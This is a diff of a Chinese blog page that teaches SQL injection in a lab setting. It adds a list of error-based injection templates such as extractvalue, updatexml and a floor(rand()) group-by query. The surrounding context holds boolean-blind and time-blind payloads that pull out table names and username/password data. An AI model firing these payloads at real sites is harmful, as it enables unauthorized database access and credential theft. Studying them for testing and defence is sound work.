@@ -41,7 +41,7 @@
 <meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411241654803.png">
 <meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411241703198.png">
 <meta property="article:published_time" content="2024-11-24T09:12:33.000Z">
-<meta property="article:modified_time" content="2024-11-24T09:22:24.841Z">
+<meta property="article:modified_time" content="2024-11-27T09:25:36.925Z">
 <meta property="article:author" content="fogpost">
 <meta property="article:tag" content="sql">
 <meta name="twitter:card" content="summary_large_image">
@@ -250,7 +250,7 @@
         
         
         
-          20 分钟
+          21 分钟
         
       </span>
     
@@ -312,14 +312,22 @@
 <p>?id&#x3D;1’and length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13–+<br>判断所有表名字符长度。<br>?id&#x3D;1’and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99–+<br>逐一判断表名</p>
 <p>?id&#x3D;1’and length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20–+<br>判断所有字段名的长度<br>?id&#x3D;1’and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99–+<br>逐一判断字段名。</p>
 <p>?id&#x3D;1’ and length((select group_concat(username,password) from users))&gt;109–+<br>判断字段内容长度<br>?id&#x3D;1’ and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50–+<br>逐一检测内容。</p>
-<h2 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiayun1995/article/details/86512290">参考文献</a></p>
-<p>在了解了bool盲注的基本原理之后我们发现一个问题，手工注入必然会导致时间过程，于是应运而生，我们的双查询注入可以帮助我们避免长时间的枯燥操作直接获取数据库的信息，在讲解之前我们要先了解几个函数</p>
+<h2 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiayun1995/article/details/86512290">参考文献</a><br>在了解了bool盲注的基本原理之后我们发现一个问题，手工注入必然会导致时间过程，于是应运而生，我们的双查询注入可以帮助我们避免长时间的枯燥操作直接获取数据库的信息，在讲解之前我们要先了解几个函数</p>
 <h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>rand()：随机数函数 返回一个0到1的数<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241656811.png" srcset="/img/loading.gif" lazyload><br>floor()：向下取整，floor的向下取整可以帮我们进行去整处理，加入乘法便可以构建任意随机数选择<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241658373.png" srcset="/img/loading.gif" lazyload><br>concat()：字符串连接函数，用于连接我们查询到的数据<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241701358.png" srcset="/img/loading.gif" lazyload><br>group by：分组 as (_<em>别名)：给查询结果起别名(括号中为自定义的别名)<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241707695.png" srcset="/img/loading.gif" lazyload><br>count()：聚合函数<br>这里利用count(</em>)对前面的返回数据进行统计，由于group by 和随机数的原因，有可能会出现重复的键值，当键值重复时就会触发错误，然后报错，由于子查询在错误发生之前就已经完成，所以子查询的内容会随着报错信息一起显示出来<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241709101.png" srcset="/img/loading.gif" lazyload><br>我们这里需要的是第一次的报错，因为在实际过程中我们不可能查询到正确消息，只有在可能遇到错误时才会有返回值</p>
 <h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><p>子查询：内部查询，允许把另一个查询嵌套到当前的查询中</p>
 <blockquote>
 <p>MariaDB [dvwa]&gt; SELECT concat(“test: “,(select database())) as a;<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241654803.png" srcset="/img/loading.gif" lazyload><br>操作开始便会先查询(select database())，然后将查询结果与”test: “连接起来，最后返回结果。</p>
 </blockquote>
 <p>在注入的过程中我们不了解库名库表，可以借用information_schema的库来猜测，其中information_schema.schemata中包含了mysql的所有库名，information_schema.tables中包含了所有的表名，information_schema.columns中包含了所有的列名<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241703198.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="报错注入模板"><a href="#报错注入模板" class="headerlink" title="报错注入模板"></a>报错注入模板</h3><ul>
+<li>select 1&#x2F;0</li>
+<li>select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a</li>
+<li>extractvalue(1, concat(0x5c,(select user())))</li>
+<li>updatexml(0x3a,concat(1,(select user())),1)</li>
+<li>exp(~(SELECT * from(select user())a))</li>
+<li>ST_LatFromGeoHash((select * from(select * from(select user())a)b))</li>
+<li>GTID_SUBSET(version(), 1)</li>
+</ul>
 <h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>?id&#x3D;1’ and if(1&#x3D;1,sleep(5),1)–+<br>判断参数构造。<br>?id&#x3D;1’and if(length((select database()))&gt;9,sleep(5),1)–+<br>判断数据库名长度</p>
 <p>?id&#x3D;1’and if(ascii(substr((select database()),1,1))&#x3D;115,sleep(5),1)–+<br>逐一判断数据库字符<br>?id&#x3D;1’and if(length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13,sleep(5),1)–+<br>判断所有表名长度</p>
 <p>?id&#x3D;1’and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99,sleep(5),1)–+<br>逐一判断表名<br>?id&#x3D;1’and if(length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20,sleep(5),1)–+<br>判断所有字段名的长度</p>
@@ -431,6 +439,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2024/11/27/web%E6%9D%82%E9%A1%B9/" title="web杂项">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">web杂项</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
